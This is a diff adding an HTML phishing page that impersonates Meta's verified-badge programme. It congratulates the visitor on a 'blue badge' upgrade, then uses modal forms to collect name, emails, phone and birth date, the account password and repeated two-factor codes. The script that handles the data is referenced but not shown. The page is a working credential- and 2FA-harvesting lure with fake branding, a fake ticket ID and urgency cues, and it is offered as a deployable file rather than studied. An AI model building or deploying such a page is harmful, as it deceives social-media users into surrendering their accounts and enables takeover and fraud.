@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Meta Verified - Rewards for you</title>
+
+  <!-- Favicon -->
+  <link rel="icon" href="/public/favicon-32x32.png" />
+
+  <!-- Custom CSS -->
+  <link rel="stylesheet" href="/style.css" />
+
+  <!-- Tailwind CDN -->
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+
+<body class="bg-gradient-to-br from-[#f9f1f9] via-[#eaf3fd] to-[#edfbf2] min-h-screen">
+
+  <!-- ===== PAGE CONTENT ===== -->
+  <div class="max-w-[768px] mx-auto p-4">
+    <div class="flex flex-col gap-6">
+
+      <img src="/public/tick.svg" class="w-12 h-12" alt="Success" />
+
+      <h1 class="text-3xl font-bold">
+        Meta Verified - Rewards for you
+      </h1>
+
+      <p class="font-semibold">
+        Show the world that you mean business.
+      </p>
+
+      <p>
+        Congratulations on achieving the requirements to upgrade your page
+        to a verified blue badge! This is a fantastic milestone that reflects
+        your dedication and the trust you've built with your audience.
+      </p>
+
+      <p>
+        We're thrilled to celebrate this moment with you and look forward
+        to seeing your page thrive with this prestigious recognition!
+      </p>
+
+      <p class="text-[#465a69]">
+        Your ticket id: #
+        <span id="ticketId">XXXX-XXXX-XXXX</span>
+      </p>
+
+      <div>
+        <h3 class="font-bold mb-2">
+          Verified Blue Badge Request Guide
+        </h3>
+        <p>- Fact checkers may not respond to requests containing intimidation, hate speech, or verbal threats.</p>
+        <p>- Please provide all required information to ensure timely processing.</p>
+        <p>- Once all details are submitted, we will evaluate your account accordingly.</p>
+      </div>
+
+      <button
+        id="submitRequestBtn"
+        class="bg-[#1877f2] text-white rounded-full py-3 px-6 font-semibold
+               w-full max-w-[300px] mx-auto">
+        Submit request
+      </button>
+
+      <div class="flex flex-wrap gap-4 text-xs text-[#65676b] justify-center mt-6">
+        <a href="#">Help Center</a>
+        <a href="#">Privacy Policy</a>
+        <a href="#">Terms of Service</a>
+        <a href="#">Community Standards</a>
+        <a href="#">Meta © 2025</a>
+      </div>
+
+    </div>
+  </div>
+
+  <!-- ===== OVERLAY ===== -->
+  <div id="overlay" class="fixed inset-0 bg-black/50 hidden z-40"></div>
+
+  <!-- ===== INFO FORM ===== -->
+  <div id="infoForm" class="fixed inset-0 hidden z-50 flex items-center justify-center">
+    <div class="bg-white w-full max-w-[420px] rounded-2xl p-6 shadow-2xl">
+
+      <h2 class="text-lg font-semibold mb-5">
+        Information Form
+      </h2>
+
+      <div class="space-y-3">
+        <input class="meta-input" placeholder="Full Name" />
+        <input class="meta-input" placeholder="Email" />
+        <input class="meta-input" placeholder="Business Email" />
+        <input class="meta-input" placeholder="Page Name" />
+        <input class="meta-input" placeholder="Phone Number" />
+
+        <div>
+          <label class="text-sm text-gray-500">Date of Birth</label>
+          <div class="grid grid-cols-3 gap-3 mt-2">
+            <input class="meta-input" placeholder="Day" />
+            <input class="meta-input" placeholder="Month" />
+            <input class="meta-input" placeholder="Year" />
+          </div>
+        </div>
+
+        <textarea class="meta-input h-24" placeholder="Additional notes (optional)"></textarea>
+
+        <label class="flex items-center gap-2 text-sm">
+          <input type="checkbox" />
+          I agree with <span class="text-blue-600">Terms of use</span>
+        </label>
+
+        <button class="w-full bg-[#1877f2] text-white py-3 rounded-full font-semibold">
+          Send
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <!-- ===== PASSWORD FORM ===== -->
+  <div id="passwordForm" class="fixed inset-0 hidden z-50 flex items-center justify-center">
+    <div class="bg-white w-full max-w-[420px] rounded-2xl p-6 shadow-2xl text-center">
+
+      <img src="/public/favicon-32x32.png"
+           class="w-10 h-10 mx-auto mb-4" alt="Meta" />
+
+      <p class="text-gray-500 mb-4">
+        For security reasons, please enter your password to continue.
+      </p>
+
+      <input id="passwordInput"
+             type="password"
+             class="meta-input mb-4"
+             placeholder="Password" />
+
+      <p id="passwordError" class="text-red-500 text-sm mb-3 hidden text-center"></p>
+      <button id="continueBtn"
+              class="w-full bg-[#1877f2] text-white py-3 rounded-full font-semibold">
+        Continue
+      </button>
+    </div>
+  </div>
+
+  <!-- ===== VERIFY CODE FORM ===== -->
+  <div id="verifyModal"
+       class="fixed inset-0 hidden z-50 flex items-center justify-center bg-black/40">
+
+    <div class="bg-white w-full max-w-[420px] rounded-2xl p-6 shadow-2xl">
+
+      <img src="/public/favicon-32x32.png"
+           class="w-10 h-10 mx-auto mb-4" alt="Meta" />
+
+      <p class="text-sm text-gray-500 mb-1 text-center">
+        <span id="userName"></span> • Facebook
+      </p>
+
+      <h2 id="verifyTitle"
+          class="text-[22px] font-bold text-gray-900 text-center mb-3">
+        Two-factor authentication required (1/3)
+      </h2>
+
+      <img src="/public/verify-illustration.png"
+           class="w-full max-w-[360px] mx-auto mb-4" alt="Verification" />
+
+      <p class="text-[14px] leading-snug text-gray-600 text-center mb-4">
+        Enter the code we sent to
+        <span id="maskedEmail" class="font-medium text-gray-700"></span>,
+        <span id="maskedPhone" class="font-medium text-gray-700"></span>
+        or confirm through your authentication app.
+      </p>
+
+      <input id="verifyCode"
+             class="meta-input mb-2"
+             placeholder="Code" />
+
+      <p id="verifyError"
+         class="text-red-500 text-sm mb-2 hidden text-center">
+        The code you entered is incorrect.
+      </p>
+
+      <p id="countdown"
+         class="text-sm text-gray-500 mb-3 hidden text-center"></p>
+
+      <button id="verifyBtn"
+              class="w-full bg-[#1877f2] text-white py-3 rounded-full font-semibold">
+        Continue
+      </button>
+
+      <img src="/public/meta.png"
+           class="w-24 mx-auto mt-5 opacity-90" alt="Meta" />
+
+    </div>
+  </div>
+
+  <!-- MAIN JS -->
+  <script src="/main.js" defer></script>
+
+</body>
+</html>
+
